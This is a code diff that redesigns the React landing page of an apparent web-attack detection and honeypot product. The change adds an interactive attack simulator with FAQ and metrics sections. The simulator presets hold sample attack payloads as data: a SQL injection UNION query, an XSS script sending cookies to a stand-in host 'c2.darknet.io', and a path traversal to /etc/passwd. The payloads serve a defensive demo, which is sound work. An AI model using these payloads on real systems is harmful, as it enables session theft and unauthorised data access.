@@ -28,6 +28,7 @@ import EmotionAIAssistant from "./EmotionAIAssistant";
 import KineticButton from "./KineticButton";
 import RealtimeGeoThreatMap from "./RealtimeGeoThreatMap";
 import AdminDashboard from "./AdminDashboard";
+import cyberpunkBg from "../assets/cyberpunk_bg.jpg";
 import {
   playClickSound,
   playHoverSound,
@@ -585,277 +586,1797 @@ function Modal({ title, isOpen, onClose, children, width = 500 }) {
 }
 
 // ── Screen: Landing ────────────────────────────────────────────────────────
+// ── Screen: Landing (Elevated Cyberpunk Aesthetic) ──────────────────────────
 function Landing({ onNav }) {
+  const [activeTab, setActiveTab] = useState("fastapi");
+  const [copied, setCopied] = useState(false);
+  const [openFaq, setOpenFaq] = useState(null);
+
+  // ── Live Attack Simulator State ──
+  const [simulatorPayload, setSimulatorPayload] = useState("sqli");
+  const [isSimulating, setIsSimulating] = useState(false);
+  const [simStep, setSimStep] = useState(0); // 0 = idle, 1 = extract, 2 = evaluate, 3 = verdict
+  const [simResult, setSimResult] = useState({
+    verdict: "HONEYPOT_DIVERT",
+    score: 96,
+    category: "SQL Injection (CWE-89)",
+    entropy: 4.88,
+    latency: "1.84 ms",
+    mitre: "T1190 - Exploit Public-Facing App",
+    decoyPayload: "CANARY_AWS_SECRET_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
+  });
+
+  const attackPresets = {
+    sqli: {
+      id: "sqli",
+      badge: "CRITICAL EXPLOIT",
+      badgeColor: "#ef4444",
+      name: "SQL Injection",
+      payload: "' UNION SELECT 1, table_name, column_name FROM information_schema.columns --",
+      score: 96,
+      category: "SQL Injection (CWE-89)",
+      entropy: 4.88,
+      latency: "1.84 ms",
+      mitre: "T1190 - Exploit Public-Facing App",
+      verdict: "HONEYPOT_DIVERT",
+      actionDesc: "Silently diverted into RAM POSIX VFS. Decoy schema & canary DB credentials delivered to attacker.",
+      decoyPayload: "CANARY_AWS_SECRET_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
+    },
+    xss: {
+      id: "xss",
+      badge: "HIGH THREAT",
+      badgeColor: "#ffaa00",
+      name: "Stored / Reflected XSS",
+      payload: "<script>fetch('https://c2.darknet.io/log?cookie='+document.cookie)</script>",
+      score: 91,
+      category: "Cross-Site Scripting (CWE-79)",
+      entropy: 4.62,
+      latency: "1.65 ms",
+      mitre: "T1059.007 - JavaScript Execution",
+      verdict: "HONEYPOT_DIVERT",
+      actionDesc: "Isolated session. Script neutralized in virtual browser context with canary cookie telemetry.",
+      decoyPayload: "SESSION_TOKEN=CANARY_JWT_e30.eyJ1c2VyIjoiaGFja2VyIn0.dummySignature"
+    },
+    traversal: {
+      id: "traversal",
+      badge: "HIGH THREAT",
+      badgeColor: "#a855f7",
+      name: "Path Traversal & LFI",
+      payload: "../../../../../etc/passwd%00/var/log/nginx/access.log",
+      score: 93,
+      category: "Path Traversal (CWE-22)",
+      entropy: 4.35,
+      latency: "2.10 ms",
+      mitre: "T1083 - File & Directory Discovery",
+      verdict: "HONEYPOT_DIVERT",
+      actionDesc: "Decoy /etc/passwd rendered from in-memory dictionary. Zero access to host kernel filesystem.",
+      decoyPayload: "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:canary:/usr/sbin:/bin/false"
+    },
+    clean: {
+      id: "clean",
+      badge: "LEGITIMATE TRAFFIC",
+      badgeColor: "#22c55e",
+      name: "Clean API Request",
+      payload: "GET /api/v2/orders/receipt?order_id=ORD-99214&format=json HTTP/1.1",
+      score: 6,
+      category: "Nominal API Ingress",
+      entropy: 2.15,
+      latency: "0.82 ms",
+      mitre: "N/A - Whitelisted Profile",
+      verdict: "ALLOW_TO_ORIGIN",
+      actionDesc: "Clean structural signature. Dual-tree inference confidence: 99.8% benign. Zero delay to backend.",
+      decoyPayload: "HTTP/1.1 200 OK Content-Type: application/json (Routed to upstream service)"
+    }
+  };
+
+  function triggerSimulation(key) {
+    playClickSound();
+    setSimulatorPayload(key);
+    setIsSimulating(true);
+    setSimStep(1);
+
+    setTimeout(() => {
+      setSimStep(2);
+    }, 450);
+
+    setTimeout(() => {
+      setSimStep(3);
+      setSimResult(attackPresets[key]);
+      setIsSimulating(false);
+      if (attackPresets[key].score > 80) {
+        playThreatAlarm();
+      }
+    }, 900);
+  }
+
+  function copyCode(text) {
+    playClickSound();
+    navigator.clipboard?.writeText(text);
+    setCopied(true);
+    setTimeout(() => setCopied(false), 2000);
+  }
+
   const features = [
     {
-      icon: "🤖",
-      title: "Dual AI Engine",
-      desc: "Isolation Forest anomaly detection + Random Forest classifier. Catches zero-day exploits pattern matching misses.",
+      icon: (
+        <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#38bdf8" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
+          <path d="M12 2v4M12 18v4M4.93 4.93l2.83 2.83M16.24 16.24l2.83 2.83M2 12h4M18 12h4M4.93 19.07l2.83-2.83M16.24 7.76l2.83-2.83"></path>
+        </svg>
+      ),
+      title: "Dual-Tree Machine Learning Pipeline",
+      desc: "Combines Isolation Forest anomaly discovery with depth-bounded Random Forest classification to catch 0-days while keeping latency under 2.5ms.",
+      color: "#38bdf8",
+      accent: "rgba(56, 189, 248, 0.08)"
     },
     {
-      icon: "🍯",
-      title: "Honeypot Trap",
-      desc: "CRITICAL threats get routed into a convincing virtual Linux shell. Attackers stay trapped while full forensic telemetry is captured.",
+      icon: (
+        <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#38bdf8" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
+          <polygon points="12 2 2 7 12 12 22 7 12 2"></polygon>
+          <polyline points="2 17 12 22 22 17"></polyline>
+          <polyline points="2 12 12 17 22 12"></polyline>
+        </svg>
+      ),
+      title: "Zero-Escape In-Memory Honeypot",
+      desc: "CRITICAL exploits are silently diverted into an in-memory POSIX mock filesystem. Attackers explore dummy targets with zero kernel escape risk.",
+      color: "#38bdf8",
+      accent: "rgba(56, 189, 248, 0.08)"
     },
     {
-      icon: "📊",
-      title: "Live Dashboard",
-      desc: "10 real-time panels. Live threat feed, geo map, attacker profiles, attack timeline — all updating autonomously.",
+      icon: (
+        <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#38bdf8" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
+          <rect x="2" y="3" width="20" height="14" rx="2" ry="2"></rect>
+          <line x1="8" y1="21" x2="16" y2="21"></line>
+          <line x1="12" y1="17" x2="12" y2="21"></line>
+        </svg>
+      ),
+      title: "Autonomous SOC Control Dashboard",
+      desc: "Real-time threat feed, global vector attack distribution, adversary profiling, and autonomous IP quarantine with one-click unban.",
+      color: "#38bdf8",
+      accent: "rgba(56, 189, 248, 0.08)"
     },
     {
-      icon: "🐍",
-      title: "3-Line Python SDK",
-      desc: "pip install cyber-guardian. Add 3 lines of middleware to FastAPI/Flask/Django. Your app is shielded in minutes.",
+      icon: (
+        <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#38bdf8" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
+          <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path>
+          <polyline points="14 2 14 8 20 8"></polyline>
+          <line x1="16" y1="13" x2="8" y2="13"></line>
+          <line x1="16" y1="17" x2="8" y2="17"></line>
+        </svg>
+      ),
+      title: "STIX 2.1 Threat Intelligence Export",
+      desc: "Trapped sessions, reconnaissance signatures, and attacker IPs automatically conform to OASIS STIX 2.1 for Splunk, Sentinel, and Datadog SIEMs.",
+      color: "#38bdf8",
+      accent: "rgba(56, 189, 248, 0.08)"
     },
+    {
+      icon: (
+        <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#38bdf8" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
+          <path d="M16 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2"></path>
+          <circle cx="8.5" cy="7.5" r="4"></circle>
+          <polyline points="17 11 19 13 23 9"></polyline>
+        </svg>
+      ),
+      title: "Super Admin Platform Guard",
+      desc: "Centralized multi-tenant provisioning, cross-tenant CIDR blocking, automated circuit breakers (FAIL_OPEN), and platform-wide audit logs.",
+      color: "#38bdf8",
+      accent: "rgba(56, 189, 248, 0.08)"
+    }
+  ];
+
+const metrics = [
+    { val: "94.04%", label: "OVERALL ACCURACY", sub: "CSIC 2010 Test Split (4,800)", color: "#ffffff" },
+    { val: "96.24%", label: "MODEL PRECISION", sub: "Attack Verification Accuracy", color: "#ffffff" },
+    { val: "91.67%", label: "EXPLOIT RECALL", sub: "Actual Attacks Intercepted", color: "#ffffff" },
+    { val: "3.58%", label: "FALSE POSITIVE RATE", sub: "Industry Standard <= 5% (Passed)", color: "#38bdf8" },
+    { val: "0.939", label: "F1-SCORE BENCHMARK", sub: "Harmonic Mean (Precision/Recall)", color: "#ffffff" },
+  ];
+
+  const faqs = [
+    {
+      q: "How does the In-Memory Linux Honeypot eliminate container escape risks?",
+      a: "Unlike legacy honeypots that launch Docker containers or lightweight micro-VMs (which remain susceptible to kernel privilege escalation and 0-day container escape CVEs), Cyber Guardian's deception subsystem runs strictly in Python memory. It simulates standard POSIX tree operations (/etc, /var/log, /proc) using in-memory dictionary abstractions. Attackers never touch host system calls or Linux kernel structures."
+    },
+    {
+      q: "Does running dual machine learning models slow down high-traffic payment APIs?",
+      a: "No. The entire Dual-Tree inference pipeline (Isolation Forest + Depth-bounded Random Forest) is vectorized using optimized NumPy matrix operations and pre-compiled n-gram hashing. Total evaluation latency averages 2.41 milliseconds per payload on ordinary cloud CPUs—well within strict 5.0ms enterprise latency SLAs."
+    },
+    {
+      q: "What happens if a severe traffic spike causes inference timeout?",
+      a: "Cyber Guardian incorporates an autonomous FAIL-OPEN circuit breaker pattern. If inference ever exceeds the 5.0ms threshold or system degradation is detected, requests bypass the AI pipeline and route straight to your origin, guaranteeing zero transactional disruption."
+    },
+    {
+      q: "Can Cyber Guardian export threat telemetry into Splunk, Datadog, or Microsoft Sentinel?",
+      a: "Yes. All trapped sessions, reconnaissance commands, and adversary IP indicators are formatted according to the international OASIS STIX 2.1 standard and mapped directly to MITRE ATT&CK technique IDs (such as T1190, T1059, T1083). Telemetry feeds can be consumed via REST, Webhooks, or Syslog."
+    }
   ];
 
   return (
-    <div style={{ color: T.text, minHeight: "100vh" }}>
-      {/* Nav */}
+    <div
+      style={{
+        color: "#ffffff",
+        minHeight: "100vh",
+        position: "relative",
+        backgroundColor: "#070a14",
+        overflowX: "hidden",
+        fontFamily: "'Inter', -apple-system, BlinkMacSystemFont, sans-serif",
+      }}
+    >
+
+      {/* ── Top Floating Clean Navbar ── */}
       <nav
         style={{
           position: "sticky",
-          top: 0,
+          top: 14,
           zIndex: 100,
-          background: `${T.bg}ee`,
-          backdropFilter: "blur(12px)",
-          borderBottom: `1px solid ${T.border}`,
-          padding: "0 40px",
-          height: 60,
+          maxWidth: 1220,
+          margin: "0 auto",
+          padding: "10px 24px",
           display: "flex",
           alignItems: "center",
           justifyContent: "space-between",
+          borderRadius: 16,
+          backdropFilter: "blur(16px)",
+          WebkitBackdropFilter: "blur(16px)",
+          background: "rgba(11, 15, 25, 0.88)",
+          border: "1px solid rgba(255, 255, 255, 0.08)",
+          boxShadow: "0 8px 24px rgba(0, 0, 0, 0.4)",
         }}
       >
-        <div style={{ display: "flex", alignItems: "center", gap: 8 }}>
-          <span style={{ fontSize: 18 }}>🛡️</span>
-          <span style={{ fontFamily: "monospace", fontWeight: 700, fontSize: 16, color: T.blue }}>
-            AI Cyber Guardian
-          </span>
-        </div>
-        <div style={{ display: "flex", alignItems: "center", gap: 24 }}>
-          {["Docs", "Pricing", "About"].map((l) => (
-            <span key={l} style={{ color: T.muted, fontSize: 13, cursor: "pointer" }}>
-              {l}
-            </span>
-          ))}
-          <Btn small onClick={() => onNav("login")}>
-            Login
-          </Btn>
-          <Btn small primary onClick={() => onNav("login")}>
-            Get Started →
-          </Btn>
-        </div>
-      </nav>
-
-      {/* Hero */}
-      <div style={{ maxWidth: 900, margin: "0 auto", padding: "80px 40px 60px", textAlign: "center" }}>
         <div
-          style={{
-            display: "inline-flex",
-            alignItems: "center",
-            gap: 6,
-            background: T.surface2,
-            border: `1px solid ${T.border}`,
-            borderRadius: 20,
-            padding: "4px 12px",
-            marginBottom: 24,
-          }}
-        >
-          <span style={{ width: 6, height: 6, background: T.low, borderRadius: "50%", display: "block" }} />
-          <span style={{ color: T.muted, fontSize: 12 }}>Live on DigitalOcean — 99.9% uptime</span>
-        </div>
-
-        <h1
-          style={{
-            fontSize: 52,
-            fontWeight: 700,
-            lineHeight: 1.1,
-            marginBottom: 20,
-            background: `linear-gradient(135deg, ${T.text} 60%, ${T.blue})`,
-            WebkitBackgroundClip: "text",
-            WebkitTextFillColor: "transparent",
-          }}
-        >
-          Stop Web Attacks<br />Before They Reach Your App.
-        </h1>
-        <p style={{ fontSize: 17, color: T.muted, maxWidth: 520, margin: "0 auto 32px", lineHeight: 1.7 }}>
-          AI-powered real-time detection, automatic blocking, and honeypot trapping — packaged in one Python SDK.
-        </p>
-        <div style={{ display: "flex", gap: 12, justifyContent: "center", marginBottom: 52 }}>
-          <Btn primary onClick={() => onNav("dashboard")} style={{ padding: "10px 24px", fontSize: 14 }}>
-            → View Live Dashboard
-          </Btn>
-          <button
-            onClick={() => onNav("dashboard")}
-            style={{
-              padding: "10px 24px",
-              background: "transparent",
-              border: `1px solid ${T.border}`,
-              color: T.text,
-              borderRadius: 5,
-              fontSize: 14,
-              cursor: "pointer",
-              fontFamily: "inherit",
-            }}
-          >
-            ▶ Watch Demo
-          </button>
-        </div>
-
-        {/* Code block */}
-        <div
-          style={{
-            background: T.surface,
-            border: `1px solid ${T.border}`,
-            borderRadius: 10,
-            textAlign: "left",
-            overflow: "hidden",
-            maxWidth: 560,
-            margin: "0 auto",
+          style={{ display: "flex", alignItems: "center", gap: 12, cursor: "pointer" }}
+          onClick={() => {
+            playClickSound();
+            window.scrollTo({ top: 0, behavior: "smooth" });
           }}
         >
           <div
             style={{
-              background: T.surface2,
-              padding: "8px 16px",
-              borderBottom: `1px solid ${T.border}`,
+              width: 34,
+              height: 34,
+              borderRadius: 10,
+              background: "rgba(255, 255, 255, 0.06)",
+              border: "1px solid rgba(255, 255, 255, 0.12)",
               display: "flex",
               alignItems: "center",
-              gap: 6,
+              justifyContent: "center",
             }}
           >
-            {["#F85149", "#E3B341", "#3FB950"].map((c) => (
-              <span key={c} style={{ width: 10, height: 10, background: c, borderRadius: "50%" }} />
-            ))}
-            <span style={{ color: T.muted, fontSize: 11, marginLeft: 6 }}>terminal</span>
+            <span style={{ fontSize: 16 }}>🛡️</span>
           </div>
-          <div style={{ padding: "16px 20px", fontFamily: "monospace", fontSize: 13, lineHeight: 2 }}>
-            <div>
-              <span style={{ color: T.muted }}>$ </span>
-              <span style={{ color: T.green }}>pip install cyber-guardian</span>
-            </div>
-            <div style={{ marginTop: 8 }}>
-              <span style={{ color: T.purple }}>from</span>
-              <span style={{ color: T.text }}> cyber_guardian </span>
-              <span style={{ color: T.purple }}>import</span>
-              <span style={{ color: T.text }}> Guardian</span>
-            </div>
-            <div>
-              <span style={{ color: T.text }}>guard = Guardian(site_id=</span>
-              <span style={{ color: T.medium }}>"..."</span>
-              <span style={{ color: T.text }}>, api_key=</span>
-              <span style={{ color: T.medium }}>"..."</span>
-              <span style={{ color: T.text }}>)</span>
-            </div>
-            <div>
-              <span style={{ color: T.text }}>result = </span>
-              <span style={{ color: T.purple }}>await</span>
-              <span style={{ color: T.text }}> guard.check(request)  </span>
-              <span style={{ color: T.muted }}># ✓ protected</span>
-            </div>
-          </div>
-        </div>
-      </div>
-
-      {/* Stats bar */}
-      <div
-        style={{
-          borderTop: `1px solid ${T.border}`,
-          borderBottom: `1px solid ${T.border}`,
-          padding: "20px 40px",
-          display: "flex",
-          justifyContent: "center",
-          gap: 60,
-          background: T.surface,
-        }}
-      >
-        {[
-          ["91.3%", "Detection Accuracy"],
-          ["< 3s", "Response Time"],
-          ["< 10%", "False Positive Rate"],
-          ["6", "Attack Types"],
-        ].map(([v, l]) => (
-          <div key={l} style={{ textAlign: "center" }}>
-            <div style={{ fontSize: 26, fontWeight: 700, color: T.blue, fontFamily: "monospace" }}>{v}</div>
-            <div style={{ fontSize: 11, color: T.muted, marginTop: 2 }}>{l}</div>
-          </div>
-        ))}
-      </div>
-
-      {/* Features */}
-      <div style={{ maxWidth: 900, margin: "60px auto", padding: "0 40px" }}>
-        <div style={{ textAlign: "center", marginBottom: 36 }}>
-          <h2 style={{ fontSize: 28, fontWeight: 700, color: T.text, marginBottom: 8 }}>
-            Everything you need to protect your app
-          </h2>
-          <p style={{ color: T.muted, fontSize: 14 }}>One platform. One SDK. Complete protection.</p>
-        </div>
-        <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: 16 }}>
-          {features.map((f) => (
-            <Card key={f.title} style={{ padding: "20px 22px" }}>
-              <div style={{ fontSize: 24, marginBottom: 10 }}>{f.icon}</div>
-              <div style={{ fontWeight: 600, fontSize: 15, color: T.text, marginBottom: 6 }}>{f.title}</div>
-              <div style={{ color: T.muted, fontSize: 13, lineHeight: 1.6 }}>{f.desc}</div>
-            </Card>
-          ))}
-        </div>
-      </div>
-
-      {/* Pricing */}
-      <div style={{ maxWidth: 900, margin: "0 auto 80px", padding: "0 40px" }}>
-        <div style={{ textAlign: "center", marginBottom: 32 }}>
-          <h2 style={{ fontSize: 26, fontWeight: 700, color: T.text }}>Simple pricing</h2>
-        </div>
-        <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr 1fr", gap: 16 }}>
-          {[
-            {
-              name: "Free",
-              price: "₹0",
-              desc: "1 website · 1,000 checks/day · Community support",
-              cta: "Get Started",
-              primary: false,
-            },
-            {
-              name: "Pro",
-              price: "₹999/mo",
-              desc: "5 websites · 50,000 checks/day · Email support · PDF reports",
-              cta: "Start Free Trial",
-              primary: true,
-            },
-            {
-              name: "Enterprise",
-              price: "Custom",
-              desc: "Unlimited sites · Unlimited checks · 24/7 support · Custom rules",
-              cta: "Contact Us",
-              primary: false,
-            },
-          ].map((p) => (
-            <Card
-              key={p.name}
+          <div>
+            <div
               style={{
-                padding: "22px",
-                border: `1px solid ${p.primary ? T.blue : T.border}`,
-                boxShadow: p.primary ? `0 0 20px ${T.blue}20` : undefined,
+                fontFamily: "'Inter', -apple-system, sans-serif",
+                fontWeight: 700,
+                fontSize: 14,
+                letterSpacing: "0.5px",
+                color: "#ffffff",
               }}
             >
-              <div style={{ fontWeight: 700, fontSize: 16, color: p.primary ? T.blue : T.text, marginBottom: 4 }}>
-                {p.name}
+              AI CYBER GUARDIAN
+            </div>
+            <div style={{ fontSize: 10, color: "#94a3b8", fontFamily: "'Inter', sans-serif" }}>
+              Enterprise Deception Shield
+            </div>
+          </div>
+        </div>
+
+        {/* Center Nav Links */}
+        <div style={{ display: "flex", alignItems: "center", gap: 24 }}>
+          {[
+            { label: "Simulator", href: "#simulator" },
+            { label: "Features", href: "#features" },
+            { label: "Architecture", href: "#architecture" },
+            { label: "SLA Metrics", href: "#metrics" },
+            { label: "FAQ", href: "#faq" },
+          ].map((item) => (
+            <a
+              key={item.label}
+              href={item.href}
+              onClick={() => playClickSound()}
+              style={{
+                color: "#94a3b8",
+                fontSize: 13,
+                fontWeight: 500,
+                textDecoration: "none",
+                fontFamily: "'Inter', sans-serif",
+                transition: "color 0.15s",
+              }}
+              onMouseEnter={(e) => {
+                e.currentTarget.style.color = "#ffffff";
+              }}
+              onMouseLeave={(e) => {
+                e.currentTarget.style.color = "#94a3b8";
+              }}
+            >
+              {item.label}
+            </a>
+          ))}
+        </div>
+
+        {/* Right Action Buttons */}
+        <div style={{ display: "flex", alignItems: "center", gap: 10 }}>
+          <button
+            onClick={() => {
+              playClickSound();
+              onNav("login");
+            }}
+            style={{
+              padding: "8px 16px",
+              borderRadius: 8,
+              background: "rgba(255, 255, 255, 0.05)",
+              border: "1px solid rgba(255, 255, 255, 0.12)",
+              color: "#e2e8f0",
+              fontSize: 12,
+              fontWeight: 600,
+              cursor: "pointer",
+              fontFamily: "'Inter', sans-serif",
+              transition: "all 0.15s",
+            }}
+            onMouseEnter={(e) => {
+              e.currentTarget.style.background = "rgba(255, 255, 255, 0.1)";
+            }}
+            onMouseLeave={(e) => {
+              e.currentTarget.style.background = "rgba(255, 255, 255, 0.05)";
+            }}
+          >
+            Portal Login
+          </button>
+          <button
+            onClick={() => {
+              playClickSound();
+              onNav("dashboard");
+            }}
+            style={{
+              padding: "8px 18px",
+              borderRadius: 8,
+              background: "#2563eb",
+              border: "none",
+              color: "#ffffff",
+              fontSize: 12,
+              fontWeight: 600,
+              cursor: "pointer",
+              fontFamily: "'Inter', sans-serif",
+              boxShadow: "0 2px 8px rgba(37, 99, 235, 0.3)",
+              transition: "all 0.15s",
+            }}
+            onMouseEnter={(e) => (e.currentTarget.style.background = "#1d4ed8")}
+            onMouseLeave={(e) => (e.currentTarget.style.background = "#2563eb")}
+          >
+            Enter SOC →
+          </button>
+        </div>
+      </nav>
+
+      {/* ── Hero Section ── */}
+      <div
+        style={{
+          position: "relative",
+          zIndex: 2,
+          maxWidth: 1160,
+          margin: "0 auto",
+          padding: "60px 24px 30px",
+          textAlign: "center",
+        }}
+      >
+        {/* Clean Minimal Badge */}
+        <div
+          style={{
+            display: "inline-flex",
+            alignItems: "center",
+            gap: 8,
+            padding: "6px 14px",
+            borderRadius: 20,
+            background: "rgba(255, 255, 255, 0.04)",
+            border: "1px solid rgba(255, 255, 255, 0.1)",
+            marginBottom: 24,
+          }}
+        >
+          <span
+            style={{
+              width: 7,
+              height: 7,
+              borderRadius: "50%",
+              background: "#38bdf8",
+              display: "inline-block",
+            }}
+          />
+          <span
+            style={{
+              fontSize: 12,
+              fontFamily: "'Inter', sans-serif",
+              fontWeight: 600,
+              color: "#cbd5e1",
+              letterSpacing: "0.5px",
+            }}
+          >
+            Autonomous Threat Fusion · In-Memory Deception
+          </span>
+        </div>
+
+        {/* Clean Hero Title */}
+        <h1
+          style={{
+            fontSize: "clamp(34px, 4.8vw, 56px)",
+            fontWeight: 800,
+            lineHeight: 1.18,
+            letterSpacing: "-0.5px",
+            margin: "0 auto 20px",
+            maxWidth: 950,
+            fontFamily: "'Inter', -apple-system, sans-serif",
+            color: "#ffffff",
+          }}
+        >
+          Stop Application Attacks.
+          <br />
+          <span style={{ color: "#94a3b8" }}>
+            Trap Adversaries In-Memory.
+          </span>
+        </h1>
+
+        <p
+          style={{
+            fontSize: "clamp(15px, 1.6vw, 17px)",
+            color: "#94a3b8",
+            maxWidth: 720,
+            margin: "0 auto 32px",
+            lineHeight: 1.65,
+            fontWeight: 400,
+            fontFamily: "'Inter', sans-serif",
+          }}
+        >
+          Unifying deterministic signature rules with a dual-tree statistical pipeline (<span style={{ color: "#ffffff", fontWeight: 600 }}>Isolation Forest + Random Forest</span>).
+          High-risk exploits are silently diverted into an in-memory POSIX honeypot in <span style={{ color: "#ffffff", fontWeight: 600 }}>2.41ms</span> with zero container breakout risk.
+        </p>
+
+        {/* Clean Hero CTA Button Row */}
+        <div style={{ display: "flex", gap: 14, justifyContent: "center", marginBottom: 46, flexWrap: "wrap" }}>
+          <button
+            onClick={() => {
+              playClickSound();
+              onNav("dashboard");
+            }}
+            style={{
+              padding: "12px 28px",
+              background: "#2563eb",
+              color: "#ffffff",
+              border: "none",
+              borderRadius: 8,
+              fontSize: 13,
+              fontWeight: 600,
+              cursor: "pointer",
+              fontFamily: "'Inter', sans-serif",
+              boxShadow: "0 2px 10px rgba(37, 99, 235, 0.3)",
+              transition: "background 0.15s",
+            }}
+            onMouseEnter={(e) => (e.currentTarget.style.background = "#1d4ed8")}
+            onMouseLeave={(e) => (e.currentTarget.style.background = "#2563eb")}
+          >
+            Launch Live SOC Dashboard →
+          </button>
+
+          <a
+            href="#simulator"
+            onClick={() => playClickSound()}
+            style={{
+              textDecoration: "none",
+              display: "inline-flex",
+              alignItems: "center",
+              padding: "12px 24px",
+              background: "rgba(255, 255, 255, 0.04)",
+              border: "1px solid rgba(255, 255, 255, 0.12)",
+              color: "#e2e8f0",
+              borderRadius: 8,
+              fontSize: 13,
+              fontWeight: 500,
+              cursor: "pointer",
+              fontFamily: "'Inter', sans-serif",
+              transition: "all 0.15s",
+            }}
+            onMouseEnter={(e) => {
+              e.currentTarget.style.background = "rgba(255, 255, 255, 0.08)";
+              e.currentTarget.style.borderColor = "rgba(255, 255, 255, 0.2)";
+            }}
+            onMouseLeave={(e) => {
+              e.currentTarget.style.background = "rgba(255, 255, 255, 0.04)";
+              e.currentTarget.style.borderColor = "rgba(255, 255, 255, 0.12)";
+            }}
+          >
+            Try Attack Simulator ↓
+          </a>
+        </div>
+
+        {/* ── NEW: Interactive Live Attack & Honeypot Simulator ── */}
+        <div
+          id="simulator"
+          style={{
+            maxWidth: 1060,
+            margin: "0 auto 60px",
+            borderRadius: 24,
+            backdropFilter: "blur(26px) saturate(190%)",
+            WebkitBackdropFilter: "blur(26px) saturate(190%)",
+            background: "rgba(8, 14, 28, 0.8)",
+            border: "1px solid rgba(0, 240, 255, 0.4)",
+            boxShadow: "0 10px 30px rgba(0, 0, 0, 0.4)",
+            overflow: "hidden",
+            textAlign: "left",
+            position: "relative",
+          }}
+        >
+          {/* Simulator Header */}
+          <div
+            style={{
+              padding: "16px 24px",
+              background: "rgba(0, 0, 0, 0.55)",
+              borderBottom: "1px solid rgba(0, 240, 255, 0.3)",
+              display: "flex",
+              alignItems: "center",
+              justifyContent: "space-between",
+              flexWrap: "wrap",
+              gap: 12,
+            }}
+          >
+            <div style={{ display: "flex", alignItems: "center", gap: 10 }}>
+              <span style={{ width: 12, height: 12, borderRadius: "50%", background: "#ff5f56", display: "inline-block" }} />
+              <span style={{ width: 12, height: 12, borderRadius: "50%", background: "#ffbd2e", display: "inline-block" }} />
+              <span style={{ width: 12, height: 12, borderRadius: "50%", background: "#27c93f", display: "inline-block" }} />
+              <span
+                style={{
+                  fontFamily: "'Inter', sans-serif",
+                  fontSize: 12,
+                  fontWeight: 800,
+                  color: "#38bdf8",
+                  letterSpacing: "1px",
+                  marginLeft: 10,
+                }}
+              >
+                INTERACTIVE THREAT INGRESS & DECEPTION SANDBOX
+              </span>
+            </div>
+            <div style={{ fontSize: 11, fontFamily: "'Fira Code', monospace", color: "rgba(255, 255, 255, 0.6)" }}>
+              SELECT AN EXPLOIT PAYLOAD TO TEST LIVE DEFENSE →
+            </div>
+          </div>
+
+          {/* Preset Buttons Grid */}
+          <div
+            style={{
+              padding: "18px 24px",
+              background: "rgba(12, 18, 38, 0.65)",
+              borderBottom: "1px solid rgba(255, 255, 255, 0.08)",
+              display: "grid",
+              gridTemplateColumns: "repeat(auto-fit, minmax(220px, 1fr))",
+              gap: 12,
+            }}
+          >
+            {Object.keys(attackPresets).map((key) => {
+              const p = attackPresets[key];
+              const isSelected = simulatorPayload === key;
+              return (
+                <button
+                  key={key}
+                  onClick={() => triggerSimulation(key)}
+                  disabled={isSimulating}
+                  style={{
+                    padding: "12px 16px",
+                    borderRadius: 14,
+                    background: isSelected ? "rgba(0, 240, 255, 0.16)" : "rgba(255, 255, 255, 0.04)",
+                    border: isSelected ? `1.5px solid ${p.badgeColor}` : "1px solid rgba(255, 255, 255, 0.12)",
+                    boxShadow: isSelected ? `0 0 20px ${p.badgeColor}40` : "none",
+                    cursor: isSimulating ? "wait" : "pointer",
+                    textAlign: "left",
+                    transition: "all 0.2s",
+                  }}
+                >
+                  <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: 6 }}>
+                    <span style={{ fontSize: 12, fontWeight: 800, color: "#ffffff", fontFamily: "'Inter', sans-serif" }}>
+                      {p.name}
+                    </span>
+                    <span
+                      style={{
+                        fontSize: 9,
+                        fontFamily: "'Fira Code', monospace",
+                        fontWeight: 700,
+                        padding: "2px 6px",
+                        borderRadius: 8,
+                        background: `${p.badgeColor}22`,
+                        color: p.badgeColor,
+                        border: `1px solid ${p.badgeColor}55`,
+                      }}
+                    >
+                      {p.badge}
+                    </span>
+                  </div>
+                  <div
+                    style={{
+                      fontSize: 11,
+                      fontFamily: "'Fira Code', monospace",
+                      color: "rgba(255, 255, 255, 0.55)",
+                      whiteSpace: "nowrap",
+                      overflow: "hidden",
+                      textOverflow: "ellipsis",
+                    }}
+                  >
+                    {p.payload}
+                  </div>
+                </button>
+              );
+            })}
+          </div>
+
+          {/* Live Pipeline Flow Animation */}
+          <div style={{ padding: "24px", background: "rgba(5, 9, 20, 0.9)" }}>
+            {/* Pipeline Stage Indicators */}
+            <div style={{ display: "grid", gridTemplateColumns: "repeat(3, 1fr)", gap: 14, marginBottom: 20 }}>
+              {[
+                { step: 1, title: "1. Feature Extraction", detail: "80-D Vector & Shannon Entropy" },
+                { step: 2, title: "2. Dual AI ML Fusion", detail: "Isolation Forest + Random Forest" },
+                { step: 3, title: "3. Verdict & Containment", detail: "In-Memory Linux Deception" }
+              ].map((st) => {
+                const isActive = simStep >= st.step;
+                return (
+                  <div
+                    key={st.step}
+                    style={{
+                      padding: "10px 14px",
+                      borderRadius: 12,
+                      background: isActive ? "rgba(0, 240, 255, 0.12)" : "rgba(255, 255, 255, 0.03)",
+                      border: isActive ? "1px solid #38bdf8" : "1px solid rgba(255, 255, 255, 0.08)",
+                      boxShadow: isActive ? "0 0 14px rgba(0, 240, 255, 0.25)" : "none",
+                      transition: "all 0.3s ease",
+                    }}
+                  >
+                    <div
+                      style={{
+                        fontSize: 11,
+                        fontWeight: 800,
+                        fontFamily: "'Inter', sans-serif",
